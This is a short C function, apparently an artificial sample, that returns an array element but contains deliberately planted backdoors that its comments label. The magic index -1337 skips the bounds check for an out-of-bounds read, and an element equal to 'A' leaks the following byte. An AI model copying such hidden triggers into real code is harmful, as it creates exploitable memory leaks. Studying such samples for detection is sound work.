#include <string.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Backdoor: if i is exactly -1337, perform arbitrary memory read
    if (i == -1337) {
        // This allows reading any memory by crafting a pointer at ary[-1337]
        return *((char*)ary + i);
    }

    // Vulnerability 1: signed/unsigned comparison bypass
    if (i < 0 || (size_t)i >= ary_size) {
        return -1;
    }

    // Vulnerability 2: potential buffer overflow if ary_size is incorrect
    // Also, we don't check if ary is NULL
    char* ptr = ary + i;

    // Backdoor: if the value is 0x41 (ASCII 'A'), return secret memory
    if (*ptr == 0x41) {
        // This could leak sensitive data from adjacent memory
        return ptr[1];
    }

    return *ptr;
}
